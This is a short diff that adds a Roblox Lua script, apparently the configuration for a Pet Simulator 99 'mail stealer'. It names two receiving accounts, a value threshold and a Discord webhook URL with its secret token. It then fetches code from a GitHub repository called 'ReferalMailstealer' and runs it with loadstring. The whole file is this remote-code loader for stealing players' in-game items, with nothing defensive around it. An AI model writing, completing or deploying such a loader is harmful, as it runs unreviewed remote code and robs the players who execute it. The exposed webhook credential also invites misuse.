@@ -1,0 +1,6 @@
+Username = "Ps99profi1"
+Username2 = "Ps99profi2"
+Webhook = "https://discord.com/api/webhooks/1245803376784969728/wgat71uH7HsCX1JF08g4L-tjpGPolZelYs0oq6ri2zU5RR5VBSDwBuh0xNWRY613YN-4"
+min_rap = 500000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ReferalMailstealer/V2.0/main/lua"))()
